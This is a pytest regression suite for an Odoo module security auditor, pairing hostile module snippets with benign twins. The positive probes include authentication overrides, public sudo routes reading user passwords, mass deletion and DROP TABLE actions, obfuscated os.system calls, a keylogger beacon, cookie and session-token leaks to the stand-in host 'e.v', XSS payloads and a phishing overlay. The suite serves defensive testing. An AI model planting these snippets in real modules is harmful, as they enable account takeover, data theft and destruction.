"""BOT-CODE-AUDIT-5: regression probes for REVIEW-CODE-AUDIT-4 (H1-H15, M1-M8, L1-L4, goal 5).

Every class has a positive probe (must yield the expected code at the expected severity) and a
negative probe (the benign twin must not).
"""

# ruff: noqa: E501
import io
import zipfile

import pytest

from app.bots import code_audit as ca

MAN = "{'name':'x','version':'17.0.1.0.0','depends':['base','web','mail','website'],'license':'LGPL-3','data':['views/v.xml'],'assets':{'web.assets_backend':['x/static/src/**/*']}}"
H = "import os, subprocess, functools, operator, importlib\nfrom odoo import models, http\nfrom odoo.http import request\n"


def run(files, man=MAN):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        if "__manifest__.py" not in files:
            z.writestr("x/__manifest__.py", man)
        z.writestr("x/__init__.py", b"from . import models\n")
        z.writestr("x/models/__init__.py", b"from . import a\n")
        for k, v in files.items():
            z.writestr("x/" + k, v.encode() if isinstance(v, str) else v)
    r = ca.audit(b.getvalue(), version=17)
    assert r.ok, r.error
    return r


def codes(files, man=MAN):
    r = run(files, man)
    return {(f.code, f.severity) for f in r.findings if f.file in files}


def py(body):
    return {
        "models/a.py": H
        + "class A(models.Model):\n    _name='a.a'\n    def f(self, n):\n"
        + "\n".join("        " + ln for ln in body.split("\n"))
        + "\n"
    }


def pyt(src):
    return {"models/a.py": H + src}


def X(b):
    return {"views/v.xml": "<odoo>\n" + b + "\n</odoo>\n"}


def J(s, n="static/src/a.js"):
    return {n: s}


# (name, files, expected (code, severity) present, negative twin files, code that must be absent at HIGH/MEDIUM)
CASES = [
    # H3 hooks / migrations
    (
        "h3-uninstall-hook",
        {"hooks.py": "def uninstall_hook(env):\n    env['res.partner'].search([]).unlink()\n"},
        ("mass-change", "high"),
        {
            "hooks.py": "def uninstall_hook(env):\n    env['res.partner'].search([('x_tag','=',1)]).unlink()\n"
        },
        "mass-change",
    ),
    (
        "h3-migration-delete",
        {
            "migrations/17.0.2/pre-migrate.py": "def migrate(cr,v):\n    cr.execute('DELETE FROM res_users')\n"
        },
        ("mass-raw-dml", "high"),
        {
            "migrations/17.0.2/pre-migrate.py": "def migrate(cr,v):\n    cr.execute('DELETE FROM x_tmp WHERE id < 10')\n"
        },
        "mass-raw-dml",
    ),
    (
        "h3-hook-loop",
        {
            "hooks.py": "def post_init_hook(env):\n    for r in env['res.partner'].search([]):\n        r.unlink()\n"
        },
        ("mass-change", "high"),
        {
            "hooks.py": "def post_init_hook(env):\n    for r in env['res.partner'].search([('x','=',1)]):\n        r.unlink()\n"
        },
        "mass-change",
    ),
    # H2 auth bypass
    (
        "h2-override-cred",
        pyt(
            "class U(models.Model):\n    _inherit='res.users'\n    def _check_credentials(self, *a, **k):\n        return {'uid':self.id}\n"
        ),
        ("auth-override", "high"),
        pyt(
            "class U(models.Model):\n    _inherit='res.users'\n    def _other(self, *a, **k):\n        return {'uid':self.id}\n"
        ),
        "auth-override",
    ),
    (
        "h2-override-access",
        pyt(
            "class P(models.Model):\n    _inherit='res.partner'\n    def check_access_rights(self,*a,**k): return True\n"
        ),
        ("auth-override", "high"),
        pyt(
            "class P(models.Model):\n    _inherit='res.partner'\n    def check_rights_label(self,*a,**k): return True\n"
        ),
        "auth-override",
    ),
    (
        "h2-monkeypatch",
        pyt(
            "from odoo.addons.base.models.res_users import Users\nUsers._check_credentials=lambda *a,**k: None\n"
        ),
        ("auth-override", "high"),
        pyt("from odoo.addons.base.models.res_users import Users\nUsers._x_label='y'\n"),
        "auth-override",
    ),
    (
        "h2-setattr",
        pyt(
            "import odoo\nsetattr(odoo.addons.base.models.res_users.Users,'_check_credentials',lambda *a,**k:None)\n"
        ),
        ("auth-override", "high"),
        pyt(
            "class P(models.Model):\n    _inherit='res.partner'\n    def f(self, n, v):\n        setattr(self, n, v)\n"
        ),
        "auth-override",
    ),
    (
        "h2-auth-none-read",
        pyt(
            "class C(http.Controller):\n    @http.route('/a',auth='none',csrf=False)\n    def a(self,**kw):\n        return request.env['res.users'].sudo().search([]).read(['login','password'])\n"
        ),
        ("public-sudo-access", "high"),
        pyt(
            "class C(http.Controller):\n    @http.route('/a',auth='user')\n    def a(self,**kw):\n        return request.env['res.users'].sudo().search([]).read(['login','password'])\n"
        ),
        "public-sudo-access",
    ),
    (
        "h2-public-write",
        pyt(
            "class C(http.Controller):\n    @http.route('/a',auth='public',type='json')\n    def a(self,id,vals):\n        request.env['res.partner'].sudo().browse(id).write(vals)\n"
        ),
        ("public-sudo-access", "high"),
        pyt(
            "class C(http.Controller):\n    @http.route('/a',auth='public',type='json')\n    def a(self,id,vals):\n        request.env['res.partner'].sudo().browse(1).write({'x': 1})\n"
        ),
        "public-sudo-access",
    ),
    # goal 5 / M4 / H1 python resolution
    (
        "g5-getattr-module",
        py("getattr(os,n)('id')"),
        ("dynamic-dispatch", "high"),
        pyt("from odoo import fields\ndef f(t):\n    return getattr(fields, t)\n"),
        "dynamic-dispatch",
    ),
    (
        "m4-attrgetter-dotted",
        pyt("import operator\noperator.attrgetter('path.os.system')(os)('id')\n"),
        ("dangerous-call", "high"),
        pyt("import operator\noperator.attrgetter('path.sep')(os)\n"),
        "dangerous-call",
    ),
    (
        "h1-methodcaller-alias",
        py("mc=operator.methodcaller\nmc('system','id')(os)"),
        ("dangerous-call", "high"),
        py("mc=operator.methodcaller\nmc('upper')('a')"),
        "dangerous-call",
    ),
    (
        "h1-reduce-getattr",
        py("functools.reduce(getattr,['system'],os)('id')"),
        ("dangerous-call", "high"),
        py("functools.reduce(lambda a,b:a+b,[1,2],0)"),
        "dangerous-call",
    ),
    (
        "h1-dunder-call",
        py("os.system.__call__('id')"),
        ("dangerous-call", "high"),
        py("str.__call__"),
        "dangerous-call",
    ),
]


@pytest.mark.parametrize("name,pos,exp,neg,code", CASES, ids=[c[0] for c in CASES])
def test_probe_positive_and_negative(name, pos, exp, neg, code):
    got = codes(pos)
    assert exp in got, (name, got)
    bad = {c for c in codes(neg) if c[0] == code and c[1] in ("high", "medium")}
    assert not bad, (name, bad)


def SA(body):
    return X(
        "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='base.model_res_partner'/>"
        + body
        + "</record>"
    )


XML_CASES = [
    # H4 server action value / fields_lines / webhook / cron loop
    (
        "h4-value-equation",
        SA(
            "<field name='state'>object_write</field><field name='evaluation_type'>equation</field><field name='value'>env['res.users'].sudo().search([]).unlink()</field>"
        ),
        ("server-mass-change", "high"),
        SA(
            "<field name='state'>object_write</field><field name='evaluation_type'>value</field><field name='value'>Hello world</field>"
        ),
        "server-mass-change",
    ),
    (
        "h4-fields-lines",
        SA(
            "<field name='state'>object_write</field><field name='fields_lines' eval=\"[(0,0,{'evaluation_type':'equation','value':'env.cr.execute(\\'drop table x\\')'})]\"/>"
        ),
        ("server-raw-dml", "high"),
        SA(
            "<field name='state'>object_write</field><field name='fields_lines' eval=\"[(0,0,{'evaluation_type':'value','value':'x'})]\"/>"
        ),
        "server-raw-dml",
    ),
    (
        "h4-webhook",
        SA("<field name='state'>webhook</field><field name='webhook_url'>https://e.v/h</field>"),
        ("server-webhook", "high"),
        SA("<field name='state'>code</field><field name='code'>records.write({'x': 1})</field>"),
        "server-webhook",
    ),
    (
        "h4-cron-loop",
        X(
            "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>for r in model.search([]): r.unlink()</field></record>"
        ),
        ("server-mass-change", "high"),
        X(
            "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>for r in model.search([('x','=',1)]): r.unlink()</field></record>"
        ),
        "server-mass-change",
    ),
    # H5 expression fields
    (
        "h5-field-compute",
        X(
            "<record id='f' model='ir.model.fields'><field name='name'>x_c</field><field name='model_id' ref='base.model_res_partner'/><field name='compute'>for r in self: r.env.cr.execute('drop table x')</field></record>"
        ),
        ("server-raw-dml", "high"),
        X(
            "<record id='f' model='ir.model.fields'><field name='name'>x_c</field><field name='model_id' ref='base.model_res_partner'/><field name='compute'>for r in self: r['x_c'] = r.name</field></record>"
        ),
        "server-raw-dml",
    ),
    (
        "h5-field-related-password",
        X(
            "<record id='f' model='ir.model.fields'><field name='name'>x_c</field><field name='model_id' ref='base.model_res_users'/><field name='related'>password</field></record>"
        ),
        ("sensitive-field-exposure", "high"),
        X(
            "<record id='f' model='ir.model.fields'><field name='name'>x_c</field><field name='model_id' ref='base.model_res_users'/><field name='related'>partner_id.name</field></record>"
        ),
        "sensitive-field-exposure",
    ),
    (
        "h5-report-name",
        X(
            "<record id='r' model='ir.actions.report'><field name='name'>r</field><field name='model'>res.partner</field><field name='report_name'>x.r</field><field name='print_report_name'>object.env.cr.execute('drop table x')</field></record>"
        ),
        ("unsafe-expression", "high"),
        X(
            "<record id='r' model='ir.actions.report'><field name='name'>r</field><field name='model'>res.partner</field><field name='report_name'>x.r</field><field name='print_report_name'>'Partner - %s' % object.name</field></record>"
        ),
        "unsafe-expression",
    ),
    # H6 privilege data
    (
        "h6-group-implies-system",
        X(
            "<record id='g' model='res.groups'><field name='name'>g</field><field name='implied_ids' eval=\"[(4,ref('base.group_system'))]\"/></record>"
        ),
        ("privilege-grant", "high"),
        X(
            "<record id='g' model='res.groups'><field name='name'>g</field><field name='implied_ids' eval=\"[(4,ref('base.group_user'))]\"/></record>"
        ),
        "privilege-grant",
    ),
    (
        "h6-user-password",
        X(
            "<record id='u' model='res.users'><field name='login'>z</field><field name='password'>z</field></record>"
        ),
        ("user-credential-data", "high"),
        X(
            "<record id='u' model='res.users'><field name='login'>z</field><field name='name'>z</field></record>"
        ),
        "user-credential-data",
    ),
    (
        "h6-access-xml-global",
        X(
            "<record id='ac' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='base.model_res_partner'/><field name='perm_unlink' eval='1'/></record>"
        ),
        ("access-global-write", "high"),
        X(
            "<record id='ac' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='base.model_res_partner'/><field name='group_id' ref='base.group_user'/><field name='perm_unlink' eval='1'/></record>"
        ),
        "access-global-write",
    ),
    (
        "h6-rule-open",
        X(
            "<record id='r' model='ir.rule'><field name='name'>r</field><field name='model_id' ref='base.model_res_users'/><field name='domain_force'>[(1,'=',1)]</field><field name='global' eval='True'/></record>"
        ),
        ("rule-open-domain", "high"),
        X(
            "<record id='r' model='ir.rule'><field name='name'>r</field><field name='model_id' ref='base.model_res_users'/><field name='domain_force'>[('id','=',user.id)]</field><field name='global' eval='True'/></record>"
        ),
        "rule-open-domain",
    ),
    # H7 csv
    (
        "h7-csv-users",
        {"data/res.users.csv": "id,login,groups_id/id\nu1,z,base.group_system\n"},
        ("privilege-grant", "high"),
        {"data/res.users.csv": "id,login,groups_id/id\nu1,z,base.group_user\n"},
        "privilege-grant",
    ),
    (
        "h7-csv-server",
        {
            "data/ir.actions.server.csv": "id,name,model_id/id,state,code\ns,s,base.model_res_partner,code,model.search([]).unlink()\n"
        },
        ("server-mass-change", "high"),
        {
            "data/ir.actions.server.csv": "id,name,model_id/id,state,code\ns,s,base.model_res_partner,code,records.write({'x': 1})\n"
        },
        "server-mass-change",
    ),
    (
        "h7-csv-config",
        {"data/ir.config_parameter.csv": "id,key,value\np,auth_signup.invitation_scope,b2c\n"},
        ("config-parameter-record", "high"),
        {"data/res.partner.csv": "id,name\np,Acme\n"},
        "config-parameter-record",
    ),
    (
        "h7-csv-rule",
        {
            "security/ir.rule.csv": "id,name,model_id:id,domain_force\nr,r,base.model_res_users,\"[(1,'=',1)]\"\n"
        },
        ("rule-open-domain", "high"),
        {
            "security/ir.rule.csv": "id,name,model_id:id,domain_force,groups/id\nr,r,base.model_res_users,\"[('id','=',user.id)]\",base.group_user\n"
        },
        "rule-open-domain",
    ),
    # H8 stored web content
    (
        "h8-website-page-arch",
        X(
            "<record id='w' model='website.page'><field name='url'>/x</field><field name='arch'>&lt;t t-raw='request.params[\"q\"]'/&gt;</field></record>"
        ),
        ("template-script", "high"),
        X(
            "<record id='w' model='website.page'><field name='url'>/x</field><field name='arch'>&lt;div&gt;&lt;t t-out='website.name'/&gt;&lt;/div&gt;</field></record>"
        ),
        "template-script",
    ),
    (
        "h8-asset-external",
        X(
            "<record id='a' model='ir.asset'><field name='name'>a</field><field name='bundle'>web.assets_backend</field><field name='path'>https://e.v/x.js</field></record>"
        ),
        ("asset-external", "high"),
        X(
            "<record id='a' model='ir.asset'><field name='name'>a</field><field name='bundle'>web.assets_backend</field><field name='path'>x/static/src/a.js</field></record>"
        ),
        "asset-external",
    ),
    (
        "h8-attachment-js",
        X(
            "<record id='a' model='ir.attachment'><field name='name'>a.js</field><field name='datas'>ZXZhbCgnMScp</field><field name='mimetype'>text/javascript</field></record>"
        ),
        ("attachment-active-content", "high"),
        X(
            "<record id='a' model='ir.attachment'><field name='name'>a.txt</field><field name='datas'>aGVsbG8=</field><field name='mimetype'>text/plain</field></record>"
        ),
        "attachment-active-content",
    ),
    # M8 delete, M5 button, misc
    (
        "m8-delete-all-core",
        X("<delete model='res.partner' search=\"[]\"/>"),
        ("xml-delete", "high"),
        X("<delete model='x.thing' id='x.rec1'/>"),
        "xml-delete",
    ),
    (
        "m5-public-unlink-button",
        X(
            "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>res.users</field><field name='arch' type='xml'><form><button name='unlink' type='object' groups='base.group_public'/></form></field></record>"
        ),
        ("public-button", "high"),
        X(
            "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>res.users</field><field name='arch' type='xml'><form><button name='unlink' type='object' groups='base.group_system'/></form></field></record>"
        ),
        "public-button",
    ),
    (
        "x-search-attr",
        X(
            "<record id='p' model='res.partner'><field name='parent_id' search=\"[('id','=',__import__('os').system('id'))]\"/></record>"
        ),
        ("unsafe-expression", "high"),
        X(
            "<record id='p' model='res.partner'><field name='parent_id' search=\"[('name','=','Acme')]\"/></record>"
        ),
        "unsafe-expression",
    ),
]


@pytest.mark.parametrize("name,pos,exp,neg,code", XML_CASES, ids=[c[0] for c in XML_CASES])
def test_xml_probe_positive_and_negative(name, pos, exp, neg, code):
    test_probe_positive_and_negative(name, pos, exp, neg, code)


# ---- batch 2: stock false positives graded, H15, L4, test-mode bundles, M7 ----


def _sev(files, code, man=MAN):
    return {f.severity for f in run(files, man).findings if f.code == code and f.file in files}


def test_h15_ref_not_found_is_not_a_dependency():
    assert not any(
        c == "xmlid-undefined"
        for c, _ in codes(py("self.env.ref('x.nope', raise_if_not_found=False)"))
    )
    assert ("xmlid-undefined", "high") in codes(py("self.env.ref('x.nope')"))


def test_l4_dangling_symlink_reported(tmp_path):
    m = tmp_path / "x"
    (m / "models").mkdir(parents=True)
    (m / "__manifest__.py").write_text(MAN)
    (m / "__init__.py").write_text("from . import models\n")
    (m / "models/__init__.py").write_text("")
    (m / "gone.py").symlink_to(tmp_path / "missing.py")
    r = ca.audit(m, version=17)
    assert (
        not r.ok or any("symlink" in f.message for f in r.findings) or "symlink" in (r.error or "")
    )


def test_public_sudo_graded():
    route = (
        "class C(http.Controller):\n    @http.route('/p', auth='public')\n    def p(self, **kw):\n"
    )
    hi = pyt(
        route + "        request.env['res.partner'].sudo().browse(int(kw['id'])).write({'x': 1})\n"
    )
    lo = pyt(route + "        request.env['x.y'].sudo().search([]).write({'seen': True})\n")
    assert "high" in _sev(hi, "public-sudo-access")
    assert _sev(lo, "public-sudo-access") <= {"medium"}


def test_own_table_truncate_not_high():
    own = py("self.env.cr.execute('TRUNCATE a_a')")
    core = py("self.env.cr.execute('TRUNCATE res_users')")
    assert "high" not in _sev(own, "mass-raw-dml")
    assert "high" in _sev(core, "mass-raw-dml")


def test_threading_read_is_not_tamper():
    read = {
        "tests/__init__.py": "from . import test_a\n",
        "tests/test_a.py": "import threading\nfrom odoo.tests import common\nx = threading.current_thread().name\n",
    }
    write = {
        "tests/__init__.py": "from . import test_a\n",
        "tests/test_a.py": "import threading\nfrom odoo.tests import common\nthreading.current_thread().testing = False\n",
    }
    assert not _sev(read, "test-tamper")
    assert "high" in _sev(write, "test-tamper")


def test_markup_body_into_message_post_medium():
    f = py("body = Markup(self.name)\nself.message_post(body=body)")
    assert "high" not in _sev(f, "tainted-markup")


def test_sqli_internal_names_medium_rpc_param_high():
    internal = pyt(
        "class A(models.Model):\n    _name='a.a'\n    def f(self):\n        w = self._where()\n        self.env.cr.execute(f'SELECT id FROM {self._table} WHERE {w}', [1])\n"
    )
    rpc = py("self.env.cr.execute('SELECT ' + n)")
    priv = pyt(
        "class A(models.Model):\n    _name='a.a'\n    def _f(self, n):\n        self.env.cr.execute('SELECT ' + n)\n"
    )
    raw = py("self.env.cr.execute(SQL(n))")
    assert _sev(internal, "sql-injection") == {"medium"}
    assert "high" in _sev(rpc, "sql-injection")
    assert _sev(priv, "sql-injection") == {"medium"}
    assert "high" in _sev(raw, "sql-injection")


def test_test_bundle_js_is_test_code_prod_bundle_is_not():
    tb = MAN.replace(
        "'web.assets_backend':['x/static/src/**/*']", "'web.assets_tests':['x/static/tests/**/*']"
    )
    pb = MAN.replace("'x/static/src/**/*'", "'x/static/tests/**/*'")
    f = J("eval(location.hash)", "static/tests/a.test.js")
    assert "high" not in _sev(f, "js-eval", tb)
    assert "high" in _sev(f, "js-eval", pb)


def test_testcase_import_ok_run_override_not():
    ok = {
        "tests/__init__.py": "from . import test_a\n",
        "tests/test_a.py": "from unittest import SkipTest, TestCase\n",
    }
    bad = {
        "tests/__init__.py": "from . import test_a\n",
        "tests/test_a.py": "from unittest import TestCase\nclass T(TestCase):\n    def run(self, result=None):\n        return None\n",
    }
    assert not _sev(ok, "test-tamper")
    assert "high" in _sev(bad, "test-tamper")


# ---- batch 3: JS / CSS / markup / inert files / QWeb probe classes (positive, negative) ----

C = lambda s, n="static/src/a.scss": {n: s}  # noqa: E731
M = lambda s, n="static/src/a.svg": {n: s}  # noqa: E731
U = lambda n, b: {n: b}  # noqa: E731

B3 = [
    (
        "script-text",
        J(
            "const s=document.createElement('scr'+'ipt'); s.textContent=atob(x); document.body.appendChild(s)"
        ),
        ("js-eval", "high"),
        J("const s=document.createElement('div'); s.textContent=x"),
    ),
    (
        "postmessage",
        J("window.parent.postMessage(document.cookie,'*')"),
        ("js-postmessage", "high"),
        J("window.parent.postMessage({a:1}, location.origin)"),
    ),
    (
        "wasm",
        J("WebAssembly.instantiateStreaming(fetch('/x/a.wasm'))"),
        ("js-eval", "high"),
        J("const w = 1"),
    ),
    (
        "patch-session",
        J(
            "import {patch} from '@web/core/utils/patch';import {session} from '@web/session';patch(session,{get uid(){return 2}})"
        ),
        ("js-patch-core", "high"),
        J(
            "import {patch} from '@web/core/utils/patch';import {FormController} from '@web/views/form/form_controller';patch(FormController.prototype,{x(){}})"
        ),
    ),
    (
        "proto",
        J("Object.prototype.isAdmin=true"),
        ("js-prototype-tamper", "high"),
        J("const o = {}; o.isAdmin = true"),
    ),
    (
        "fetch-hook",
        J("window.fetch = function(){}"),
        ("js-network-hook", "high"),
        J("const f = window.fetch"),
    ),
    (
        "keylogger",
        J("document.addEventListener('keydown', e => navigator.sendBeacon('/l', e.key))"),
        ("js-keylogger", "high"),
        J("document.addEventListener('keydown', e => console.log(e.key))"),
    ),
    (
        "dom-xss",
        J("document.body.innerHTML = location.hash.slice(1)"),
        ("js-dom-xss", "high"),
        J("document.body.textContent = location.hash"),
    ),
    (
        "join-eval",
        J("window[['ev','al'].join('')]('1')"),
        ("js-eval", "high"),
        J("const s = ['a','b'].join('')"),
    ),
    (
        "reflect-cookie",
        J("fetch('/x',{body:Reflect.get(document,'cookie')})"),
        ("js-cookie-leak", "high"),
        J("fetch('/x',{body:Reflect.get(o,'name')})"),
    ),
    (
        "owl-t-on",
        J(
            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<div t-on-click='() => window[\"ev\"+\"al\"](props.c)'/>`}"
        ),
        ("js-eval", "high"),
        J(
            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<div t-on-click='() => this.save()'/>`}"
        ),
    ),
    (
        "owl-href",
        J(
            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<a t-att-href='props.url'>x</a>`}"
        ),
        ("owl-url-attr", "low"),
        J(
            "import {Component,xml} from '@odoo/owl';\nclass A extends Component{static template=xml`<a t-attf-href='/web#id={{props.id}}'>x</a>`}"
        ),
    ),
    (
        "ts-namespace",
        J("namespace N { export const e = 1; }", "static/src/a.ts"),
        ("web-unaudited", "high"),
        J("enum E {A}\nexport const x: number = 1;", "static/src/a.ts"),
    ),
    (
        "tsx-cookie",
        J("const a = <img src={'//e.v/'+document.cookie}/>;", "static/src/a.tsx"),
        ("js-cookie-leak", "high"),
        J("const a = <img src={'/web/image/1'}/>;", "static/src/a.tsx"),
    ),
    (
        "sourcemap",
        J("var a=1;\n//# sourceMappingURL=https://e.v/a.map"),
        ("js-external-request", "medium"),
        J("var a=1;\n//# sourceMappingURL=a.js.map"),
    ),
    (
        "markup-data",
        J("import {markup} from '@odoo/owl'; const x = markup(this.props.record.data.body)"),
        ("js-markup", "medium"),
        J("import {markup} from '@odoo/owl'; const x = markup('<b>x</b>')"),
    ),
    (
        "scss-interp",
        C("$h:'https://e.v';a{background:url(#{$h}/a)}"),
        ("css-external-url", "medium"),
        C("$h:'/x/static';a{background:url(#{$h}/a.png)}"),
    ),
    (
        "scss-concat",
        C("$h:'ht'+'tps://e.v/a';a{background:url($h)}"),
        ("css-external-url", "medium"),
        C("$h:'/x'+'/a.png';a{background:url($h)}"),
    ),
    (
        "scss-mixin",
        C("@mixin m($u){background:url($u)}a{@include m('https://e.v/x')}"),
        ("css-external-url", "medium"),
        C("@mixin m($u){background:url($u)}a{@include m('/x/a.png')}"),
    ),
    (
        "scss-load-css",
        C("@use 'sass:meta';a{@include meta.load-css('https://e.v/x')}"),
        ("css-external-import", "high"),
        C("@use 'sass:meta';a{@include meta.load-css('x/b')}"),
    ),
    (
        "less-import-css",
        C("@import (css) url('https://e.v/x.css');", "static/src/a.less"),
        ("css-external-import", "high"),
        C("@import (css) url('/x/static/a.css');", "static/src/a.less"),
    ),
    (
        "css-overlay",
        C(
            ".o_x::before{content:'Session expired, enter password at e.v';position:fixed;inset:0;z-index:99999}",
            "static/src/a.css",
        ),
        ("css-overlay", "medium"),
        C(".o_x::before{content:'';position:fixed;inset:0;z-index:99999}", "static/src/a.css"),
    ),
    (
        "svg-feimage",
        M(
            "<svg xmlns='http://www.w3.org/2000/svg'><filter><feImage href='https://e.v/a'/></filter></svg>"
        ),
        ("markup-external-resource", "medium"),
        M("<svg xmlns='http://www.w3.org/2000/svg'><filter><feImage href='#a'/></filter></svg>"),
    ),
    (
        "html-object",
        M("<html><object data='https://e.v/x.swf'></object></html>", "static/src/a.html"),
        ("markup-plugin", "high"),
        M("<html><p>x</p></html>", "static/src/a.html"),
    ),
    (
        "html-malformed",
        M("<scr<script>ipt>alert(1)</script>", "static/src/a.html"),
        ("markup-script", "high"),
        M("<html><p>script</p></html>", "static/src/a.html"),
    ),
    (
        "html-srcdoc",
        M('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', "static/src/a.html"),
        ("markup-script", "high"),
        M("<html><iframe src='/x'></iframe></html>", "static/src/a.html"),
    ),
    (
        "rst-raw",
        U("README.rst", ".. raw:: html\n\n   <script>alert(1)</script>"),
        ("doc-active-content", "medium"),
        U("README.rst", "Title\n=====\n\ntext"),
    ),
    (
        "requirements",
        U("requirements.txt", "evilpkg==1.0\n--index-url https://e.v/simple\n"),
        ("dependency-source", "medium"),
        U("requirements.txt", "requests==2.31.0\n"),
    ),
    (
        "png-polyglot",
        U("static/description/icon.png", b"\x89PNG\r\n\x1a\n<script>alert(1)</script>"),
        ("polyglot-content", "medium"),
        U("static/description/icon.png", b"\x89PNG\r\n\x1a\n\x00\x00IHDR"),
    ),
    (
        "png-fake",
        U(
            "static/description/icon.png",
            b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
        ),
        ("content-mismatch", "high"),
        U("static/description/icon.png", b"\xff\xd8\xff\xe0JFIF"),
    ),
    (
        "docx-bad",
        U("static/a.docx", b"PK\x03\x04garbage"),
        ("content-mismatch", "medium"),
        U("static/a.txt", b"hello"),
    ),
    (
        "egg-info",
        U("x.egg-info/entry_points.txt", "[console_scripts]\nx=os:system\n"),
        ("packaging-metadata", "medium"),
        U("doc/entry_points.txt", "notes"),
    ),
    (
        "importmap",
        U("static/src/importmap.json", '{"import":"https://e.v/x.js"}'),
        ("json-external-url", "medium"),
        U("static/src/a.json", '{"a":1}'),
    ),
    (
        "qweb-tcall",
        X("<template id='p'><t t-call='{{request.params.get(\"t\")}}'/></template>"),
        ("qweb-dynamic-call", "high"),
        X("<template id='p'><t t-call='web.layout'/></template>"),
    ),
    (
        "qweb-token",
        X(
            "<template id='p'><img t-attf-src='https://e.v/?c={{request.session.session_token}}'/></template>"
        ),
        ("qweb-token-leak", "high"),
        X("<template id='p'><img t-attf-src='/web/image/{{o.id}}'/></template>"),
    ),
    (
        "qweb-href-req",
        X("<template id='p'><a t-att-href='request.params.get(\"u\")'>x</a></template>"),
        ("qweb-dynamic-url", "medium"),
        X("<template id='p'><a t-attf-href='/shop/{{p.id}}'>x</a></template>"),
    ),
    (
        "file-missing",
        X(
            "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html' type='html' file='x/data/b.html'/></record>"
        ),
        ("data-file-unaudited", "medium"),
        X(
            "<record id='m' model='mail.template'><field name='name'>m</field><field name='model_id' ref='base.model_res_partner'/><field name='body_html' type='html'><p>x</p></field></record>"
        ),
    ),
    (
        "server-unlink",
        X(
            "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>records.unlink()</field></record>"
        ),
        ("server-action-unlink", "medium"),
        X(
            "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>records.write({'active': False})</field></record>"
        ),
    ),
]


@pytest.mark.parametrize("name,pos,want,neg", B3, ids=[b[0] for b in B3])
def test_batch3_probe_classes(name, pos, want, neg):
    assert want in codes(pos), name
    assert (want[0], "high") not in codes(neg) and (want[0], want[1]) not in codes(neg), name


# --- H1/M1: private Node library closure, per-library pinned hashes; L3 pin command ----


def _webmod():
    from app.bots import code_audit_web as web

    return web


def test_h1_private_closure_has_no_outside_library(monkeypatch):
    import subprocess
    import sys

    web = _webmod()
    if web.helper_problem():
        pytest.skip("helper unavailable")
    if sys.platform != "darwin":
        pytest.skip("macOS relink")
    seen = []
    real = web._run_batch

    def spy(node, d, b):
        root = web.Path(node).parent.parent
        for o in [root / "bin" / "node", *sorted((root / "lib").iterdir())]:
            out = subprocess.run(["/usr/bin/otool", "-L", str(o)], capture_output=True, text=True)
            for line in out.stdout.splitlines()[1:]:
                p = line.strip().split(" (", 1)[0]
                seen.append(p)
        return real(node, d, b)

    monkeypatch.setattr(web, "_run_batch", spy)
    res = web.run([("a.js", "js", "x = 1")])
    assert isinstance(res, dict) and res["a.js"]["ok"]
    outside = [p for p in seen if p.startswith("/") and not p.startswith(("/usr/lib/", "/System/"))]
    assert seen and not outside


@pytest.mark.parametrize("mutate", ["one_lib", "format", "names"])
def test_m1_per_lib_pin_fails_closed(tmp_path, monkeypatch, mutate):
    import json

    web = _webmod()
    if web._pin() is None:
        pytest.skip("node not pinned on this host")
    pin = json.loads(web.NODE_PIN.read_text())
    if mutate == "one_lib":
        pin["lib_sha256"][pin["libs"][0]] = "0" * 64
    elif mutate == "format":
        pin.pop("format")
    else:
        pin["names"].popitem()
    p = tmp_path / "node.pin.json"
    p.write_text(json.dumps(pin))
    monkeypatch.setattr(web, "NODE_PIN", p)
    assert web._pin() is None
    assert isinstance(web.run([("a.js", "js", "x = 1")]), str)


def test_m1_copy_compared_with_pin_not_original(tmp_path, monkeypatch):
    web = _webmod()
    monkeypatch.setattr(web, "NODE_CACHE_ROOT", tmp_path / "c")
    if web.helper_problem():
        pytest.skip("helper unavailable")
    pin = web._pin()
    victim = next(iter(pin["names"]))
    real = web.shutil.copy2

    def swap(src, dst, *a, **k):
        r = real(src, dst, *a, **k)
        if str(dst).endswith("/lib/" + victim):
            web.os.chmod(dst, 0o600)
            with open(dst, "ab") as f:
                f.write(b"\0")
        return r

    monkeypatch.setattr(web.shutil, "copy2", swap)
    assert web.run([("a.js", "js", "x = 1")]) == "Node.js library copy does not match its pin"


def test_h1_relink_refuses_unpinned_library(tmp_path, monkeypatch):
    import sys

    web = _webmod()
    monkeypatch.setattr(web, "NODE_CACHE_ROOT", tmp_path / "c")
    if web.helper_problem() or sys.platform != "darwin":
        pytest.skip("macOS helper")
    monkeypatch.setattr(web, "_raw_deps", lambda o: ["x", "/opt/evil/libevil.dylib"])
    assert web.run([("a.js", "js", "x = 1")]) == "Node.js loads a library outside its pin"


def test_l3_pin_command_usage_and_missing_node(tmp_path, monkeypatch, capsys):
    web = _webmod()
    monkeypatch.setattr(web, "NODE_PIN", tmp_path / "node.pin.json")
    assert web.main([]) == 2
    assert "--pin-node" in capsys.readouterr().err
    monkeypatch.setattr(web, "_find_node", lambda: None)
    assert web.main(["--pin-node"]) == 1
    err = capsys.readouterr().err
    assert "Node.js not found" in err and "--pin-node" in err
    assert not (tmp_path / "node.pin.json").exists()
    assert web.main(["--pin-node", str(tmp_path / "nope")]) == 1


def test_l3_unpinned_reason_names_the_command(tmp_path, monkeypatch):
    web = _webmod()
    monkeypatch.setattr(web, "NODE_PIN", tmp_path / "missing.json")
    assert "--pin-node" in web.helper_problem()


